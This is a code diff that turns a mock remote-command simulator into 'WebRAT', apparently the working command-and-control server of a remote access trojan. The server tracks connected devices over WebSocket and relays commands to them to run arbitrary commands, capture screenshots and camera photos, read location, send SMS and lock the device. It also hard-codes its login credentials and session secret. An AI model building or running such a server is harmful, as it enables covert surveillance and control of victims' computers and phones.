@@ -1,197 +1,438 @@
 const express = require('express');
-const { v4: uuidv4 } = require('uuid');
+const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
+const WebSocket = require('ws');
+const http = require('http');
+const session = require('express-session');
+const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
+const validator = require('validator');
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
 
-// Middleware
-app.use(express.json());
-app.use(express.static('public'));
+// Security Configuration
+const LOGIN_CREDENTIALS = {
+  username: 'Jayjay100!',
+  password: 'Jayjay100!'
+};
 
-// CORS middleware
-app.use((req, res, next) => {
-    res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
-    
-    if (req.method === 'OPTIONS') {
-        res.sendStatus(200);
-    } else {
-        next();
-    }
+// Rate limiting
+const limiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minutes
+  max: 100 // limit each IP to 100 requests per windowMs
 });
 
-// In-memory storage
-const clients = new Map([
-    ['client-1', { id: 'client-1', name: 'Production Server', ip: '192.168.1.100', os: 'Windows Server 2019', status: 'online', lastSeen: new Date() }],
-    ['client-2', { id: 'client-2', name: 'Development VM', ip: '192.168.1.101', os: 'Windows 11', status: 'online', lastSeen: new Date() }],
-    ['client-3', { id: 'client-3', name: 'Testing Container', ip: '192.168.1.102', os: 'Ubuntu 22.04', status: 'online', lastSeen: new Date() }],
-    ['client-4', { id: 'client-4', name: 'Staging Server', ip: '192.168.1.103', os: 'CentOS 8', status: 'offline', lastSeen: new Date(Date.now() - 2 * 60 * 60 * 1000) }]
-]);
+// Security middleware
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      scriptSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", "data:", "blob:"],
+      connectSrc: ["'self'", "ws:", "wss:"]
+    }
+  }
+}));
 
-const executions = new Map();
+app.use(limiter);
+app.use(cors({
+  origin: ['https://webrat.vercel.app', 'http://localhost:5000'],
+  credentials: true
+}));
 
-// Mock command simulation
-function simulateCommand(code, clientId) {
-    const startTime = Date.now();
-    const commands = code.toLowerCase().split('\n').filter(cmd => cmd.trim());
-    
-    let output = '';
-    
-    commands.forEach((command) => {
-        const cmd = command.trim();
-        
-        if (cmd.startsWith('dir') || cmd.startsWith('ls')) {
-            output += `Directory of C:\\Users\\Administrator\n\n`;
-            output += `01/15/2024  02:30 PM    <DIR>          .\n`;
-            output += `01/15/2024  02:30 PM    <DIR>          ..\n`;
-            output += `01/10/2024  10:15 AM             1,234  index.js\n`;
-            output += `01/12/2024  03:45 PM             5,678  client.py\n`;
-            output += `01/14/2024  11:20 AM    <DIR>          Documents\n`;
-            output += `01/13/2024  09:30 AM    <DIR>          Desktop\n`;
-            output += `               2 File(s)          6,912 bytes\n`;
-            output += `               4 Dir(s)  15,728,640,000 bytes free\n\n`;
-            
-        } else if (cmd.startsWith('echo')) {
-            const message = cmd.replace('echo', '').trim().replace(/['"]/g, '');
-            output += `${message}\n\n`;
-            
-        } else if (cmd.includes('ipconfig')) {
-            output += `Windows IP Configuration\n\n`;
-            output += `Ethernet adapter Ethernet:\n\n`;
-            output += `   Connection-specific DNS Suffix  . : \n`;
-            output += `   IPv4 Address. . . . . . . . . . . : 192.168.1.100\n`;
-            output += `   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n`;
-            output += `   Default Gateway . . . . . . . . . : 192.168.1.1\n\n`;
-            
-        } else if (cmd.includes('systeminfo')) {
-            const client = clients.get(clientId);
-            output += `Host Name:                 ${client?.name.replace(/\s+/g, '-').toUpperCase() || 'SERVER-01'}\n`;
-            output += `OS Name:                   Windows Server 2019\n`;
-            output += `OS Version:                10.0.17763 N/A Build 17763\n`;
-            output += `System Type:               x64-based PC\n`;
-            output += `Total Physical Memory:     8,192 MB\n`;
-            output += `Available Physical Memory: 4,096 MB\n`;
-            output += `Processor(s):              1 Processor(s) Installed.\n`;
-            output += `                          [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~2400 Mhz\n\n`;
-            
-        } else if (cmd.includes('whoami')) {
-            output += `SERVER-01\\Administrator\n\n`;
-            
-        } else if (cmd.includes('ping')) {
-            const target = cmd.split(' ').pop() || 'google.com';
-            output += `Pinging ${target} [142.250.191.14] with 32 bytes of data:\n\n`;
-            output += `Reply from 142.250.191.14: bytes=32 time=23ms TTL=57\n`;
-            output += `Reply from 142.250.191.14: bytes=32 time=25ms TTL=57\n`;
-            output += `Reply from 142.250.191.14: bytes=32 time=24ms TTL=57\n`;
-            output += `Reply from 142.250.191.14: bytes=32 time=22ms TTL=57\n\n`;
-            output += `Ping statistics for 142.250.191.14:\n`;
-            output += `    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\n`;
-            output += `Approximate round trip times in milli-seconds:\n`;
-            output += `    Minimum = 22ms, Maximum = 25ms, Average = 23ms\n\n`;
-            
-        } else if (cmd.includes('tasklist')) {
-            output += `Image Name                     PID Session Name        Session#    Mem Usage\n`;
-            output += `========================= ======== ================ =========== ============\n`;
-            output += `System Idle Process              0 Services                   0          8 K\n`;
-            output += `System                           4 Services                   0        228 K\n`;
-            output += `smss.exe                       324 Services                   0      1,036 K\n`;
-            output += `csrss.exe                      424 Services                   0      4,176 K\n`;
-            output += `winlogon.exe                   448 Services                   0      2,912 K\n`;
-            output += `services.exe                   492 Services                   0      6,320 K\n`;
-            output += `lsass.exe                      504 Services                   0     12,456 K\n\n`;
-            
-        } else {
-            output += `'${cmd}' is not recognized as an internal or external command,\n`;
-            output += `operable program or batch file.\n\n`;
-        }
-    });
-    
-    const runtime = ((Date.now() - startTime) + Math.random() * 1000) / 1000;
-    
-    return {
-        output: output.trim(),
-        error: code.includes('error') ? 'Command execution failed' : null,
-        runtime: `${runtime.toFixed(2)}s`
-    };
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+
+// Session configuration
+app.use(session({
+  secret: 'webrat-secure-session-key-2025',
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    secure: process.env.NODE_ENV === 'production',
+    httpOnly: true,
+    maxAge: 24 * 60 * 60 * 1000 // 24 hours
+  }
+}));
+
+// XSS Protection middleware
+const sanitizeInput = (req, res, next) => {
+  if (req.body) {
+    for (const key in req.body) {
+      if (typeof req.body[key] === 'string') {
+        req.body[key] = validator.escape(req.body[key]);
+      }
+    }
+  }
+  next();
+};
+
+app.use(sanitizeInput);
+
+// Authentication middleware
+const requireAuth = (req, res, next) => {
+  if (!req.session.authenticated) {
+    return res.status(401).json({ error: 'Authentication required' });
+  }
+  next();
+};
+
+// Serve static files
+app.use(express.static(path.join(__dirname, '../public')));
+
+// Connected devices storage
+let connectedDevices = new Map();
+let deviceStats = new Map();
+
+// WebSocket connection handling
+wss.on('connection', (ws, req) => {
+  const clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  console.log(`WebSocket connection from ${clientIP}`);
+  
+  ws.on('message', (message) => {
+    try {
+      const data = JSON.parse(message);
+      handleWebSocketMessage(ws, data, clientIP);
+    } catch (error) {
+      console.error('WebSocket message error:', error);
+    }
+  });
+  
+  ws.on('close', () => {
+    // Remove device from connected list
+    for (const [deviceId, device] of connectedDevices.entries()) {
+      if (device.ws === ws) {
+        connectedDevices.delete(deviceId);
+        broadcastDeviceList();
+        break;
+      }
+    }
+  });
+});
+
+function handleWebSocketMessage(ws, data, clientIP) {
+  switch (data.type) {
+    case 'register':
+      registerDevice(ws, data, clientIP);
+      break;
+    case 'heartbeat':
+      updateDeviceHeartbeat(data.deviceId);
+      break;
+    case 'command_result':
+    case 'screenshot':
+    case 'camera_photo':
+    case 'location':
+      forwardToControllers(data);
+      break;
+    default:
+      console.log('Unknown WebSocket message type:', data.type);
+  }
+}
+
+function registerDevice(ws, data, clientIP) {
+  const deviceId = data.deviceId || generateDeviceId();
+  const device = {
+    id: deviceId,
+    name: data.deviceInfo?.model || data.name || 'Unknown Device',
+    type: data.clientType || 'unknown',
+    ip: clientIP,
+    osInfo: data.deviceInfo || {},
+    deviceType: data.clientType === 'mobile' ? 'mobile' : 'pc',
+    status: 'online',
+    lastSeen: Date.now(),
+    ws: ws
+  };
+  
+  connectedDevices.set(deviceId, device);
+  broadcastDeviceList();
+  
+  console.log(`Device registered: ${device.name} (${device.type})`);
+}
+
+function updateDeviceHeartbeat(deviceId) {
+  const device = connectedDevices.get(deviceId);
+  if (device) {
+    device.lastSeen = Date.now();
+    device.status = 'online';
+  }
+}
+
+function broadcastDeviceList() {
+  const deviceList = Array.from(connectedDevices.values()).map(device => ({
+    id: device.id,
+    name: device.name,
+    type: device.type,
+    ip: device.ip,
+    osInfo: device.osInfo,
+    deviceType: device.deviceType,
+    status: device.status,
+    lastSeen: device.lastSeen
+  }));
+  
+  const message = JSON.stringify({
+    type: 'device_list',
+    devices: deviceList
+  });
+  
+  wss.clients.forEach(client => {
+    if (client.readyState === WebSocket.OPEN) {
+      client.send(message);
+    }
+  });
+}
+
+function forwardToControllers(data) {
+  const message = JSON.stringify(data);
+  wss.clients.forEach(client => {
+    if (client.readyState === WebSocket.OPEN) {
+      client.send(message);
+    }
+  });
+}
+
+function generateDeviceId() {
+  return 'device_' + Math.random().toString(36).substr(2, 9);
 }
 
 // API Routes
-app.get('/api/clients', (req, res) => {
-    const clientArray = Array.from(clients.values());
-    res.json(clientArray);
+
+// Login endpoint
+app.post('/api/login', (req, res) => {
+  const { username, password } = req.body;
+  
+  if (!username || !password) {
+    return res.status(400).json({ error: 'Username and password required' });
+  }
+  
+  if (username === LOGIN_CREDENTIALS.username && password === LOGIN_CREDENTIALS.password) {
+    req.session.authenticated = true;
+    req.session.user = username;
+    res.json({ success: true, message: 'Login successful' });
+  } else {
+    res.status(401).json({ error: 'Invalid credentials' });
+  }
 });
 
-app.get('/api/clients/:id', (req, res) => {
-    const client = clients.get(req.params.id);
-    if (!client) {
-        return res.status(404).json({ message: 'Client not found' });
-    }
-    res.json(client);
+// Logout endpoint
+app.post('/api/logout', (req, res) => {
+  req.session.destroy();
+  res.json({ success: true, message: 'Logged out successfully' });
 });
 
-app.post('/api/execute', (req, res) => {
-    const { clientId, language, code } = req.body;
-    
-    if (!clientId || !code) {
-        return res.status(400).json({ message: 'Client ID and code are required' });
-    }
-    
-    const client = clients.get(clientId);
-    if (!client) {
-        return res.status(404).json({ message: 'Client not found' });
-    }
-    
-    if (client.status !== 'online') {
-        return res.status(400).json({ message: 'Client is not online' });
-    }
-    
-    const executionId = uuidv4();
-    const execution = {
-        id: executionId,
-        clientId,
-        language: language || 'cmd',
-        code,
-        status: 'running',
-        output: null,
-        error: null,
-        runtime: null,
-        executedAt: new Date().toISOString()
-    };
-    
-    executions.set(executionId, execution);
-    
-    // Simulate execution with delay
-    setTimeout(() => {
-        const result = simulateCommand(code, clientId);
-        execution.status = result.error ? 'failed' : 'completed';
-        execution.output = result.output;
-        execution.error = result.error;
-        execution.runtime = result.runtime;
-    }, 1000 + Math.random() * 2000);
-    
-    res.json(execution);
+// Check authentication status
+app.get('/api/auth/status', (req, res) => {
+  res.json({ 
+    authenticated: !!req.session.authenticated,
+    user: req.session.user || null
+  });
 });
 
-app.get('/api/executions/:id', (req, res) => {
-    const execution = executions.get(req.params.id);
-    if (!execution) {
-        return res.status(404).json({ message: 'Execution not found' });
+// Get connected devices
+app.get('/api/devices', requireAuth, (req, res) => {
+  const devices = Array.from(connectedDevices.values()).map(device => ({
+    id: device.id,
+    name: device.name,
+    type: device.type,
+    ip: device.ip,
+    osInfo: device.osInfo,
+    deviceType: device.deviceType,
+    status: device.status,
+    lastSeen: device.lastSeen
+  }));
+  
+  res.json(devices);
+});
+
+// Send command to device
+app.post('/api/devices/:deviceId/command', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const { command, type } = req.body;
+  
+  const device = connectedDevices.get(deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const message = JSON.stringify({
+    type: type || 'command',
+    command: command,
+    deviceId: deviceId,
+    timestamp: Date.now()
+  });
+  
+  if (device.ws.readyState === WebSocket.OPEN) {
+    device.ws.send(message);
+    res.json({ success: true, message: 'Command sent' });
+  } else {
+    res.status(500).json({ error: 'Device not reachable' });
+  }
+});
+
+// Take screenshot
+app.post('/api/devices/:deviceId/screenshot', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const message = JSON.stringify({
+    type: 'screenshot',
+    deviceId: deviceId,
+    timestamp: Date.now()
+  });
+  
+  if (device.ws.readyState === WebSocket.OPEN) {
+    device.ws.send(message);
+    res.json({ success: true, message: 'Screenshot request sent' });
+  } else {
+    res.status(500).json({ error: 'Device not reachable' });
+  }
+});
+
+// Camera photo
+app.post('/api/devices/:deviceId/camera', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const message = JSON.stringify({
+    type: 'camera_photo',
+    deviceId: deviceId,
+    timestamp: Date.now()
+  });
+  
+  if (device.ws.readyState === WebSocket.OPEN) {
+    device.ws.send(message);
+    res.json({ success: true, message: 'Camera request sent' });
+  } else {
+    res.status(500).json({ error: 'Device not reachable' });
+  }
+});
+
+// Get device location
+app.post('/api/devices/:deviceId/location', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const message = JSON.stringify({
+    type: 'get_location',
+    deviceId: deviceId,
+    timestamp: Date.now()
+  });
+  
+  if (device.ws.readyState === WebSocket.OPEN) {
+    device.ws.send(message);
+    res.json({ success: true, message: 'Location request sent' });
+  } else {
+    res.status(500).json({ error: 'Device not reachable' });
+  }
+});
+
+// Send SMS (mobile only)
+app.post('/api/devices/:deviceId/sms', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const { number, text } = req.body;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (device.deviceType !== 'mobile') {
+    return res.status(400).json({ error: 'SMS only available for mobile devices' });
+  }
+  
+  const message = JSON.stringify({
+    type: 'send_sms',
+    number: validator.escape(number),
+    text: validator.escape(text),
+    deviceId: deviceId,
+    timestamp: Date.now()
+  });
+  
+  if (device.ws.readyState === WebSocket.OPEN) {
+    device.ws.send(message);
+    res.json({ success: true, message: 'SMS request sent' });
+  } else {
+    res.status(500).json({ error: 'Device not reachable' });
+  }
+});
+
+// Lock device
+app.post('/api/devices/:deviceId/lock', requireAuth, (req, res) => {
+  const { deviceId } = req.params;
+  const device = connectedDevices.get(deviceId);
+  
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  const message = JSON.stringify({
+    type: 'lock_device',
+    deviceId: deviceId,
+    timestamp: Date.now()
+  });
+  
+  if (device.ws.readyState === WebSocket.OPEN) {
+    device.ws.send(message);
+    res.json({ success: true, message: 'Lock request sent' });
+  } else {
+    res.status(500).json({ error: 'Device not reachable' });
+  }
+});
+
+// Health check endpoint
+app.get('/api/health', (req, res) => {
+  res.json({ 
+    status: 'healthy',
+    timestamp: new Date().toISOString(),
+    devices: connectedDevices.size
+  });
+});
+
+// Serve main application
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, '../public/index.html'));
+});
+
+// Error handling middleware
+app.use((error, req, res, next) => {
+  console.error('Server error:', error);
+  res.status(500).json({ error: 'Internal server error' });
+});
+
+// Clean up disconnected devices periodically
+setInterval(() => {
+  const now = Date.now();
+  const timeout = 60000; // 1 minute timeout
+  
+  for (const [deviceId, device] of connectedDevices.entries()) {
+    if (now - device.lastSeen > timeout) {
+      connectedDevices.delete(deviceId);
+      console.log(`Device timeout: ${device.name}`);
     }
-    res.json(execution);
-});
+  }
+  
+  broadcastDeviceList();
+}, 30000); // Check every 30 seconds
 
-// Serve static files
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-// Start server
-app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Remote Code Executor running on port ${PORT}`);
-    console.log(`🌐 Access at: http://localhost:${PORT}`);
-    console.log(`📝 Ready for client connections`);
+const PORT = process.env.PORT || 5000;
+server.listen(PORT, '0.0.0.0', () => {
+  console.log(`WebRAT Server running on port ${PORT}`);
+  console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
 });
 
 module.exports = app;
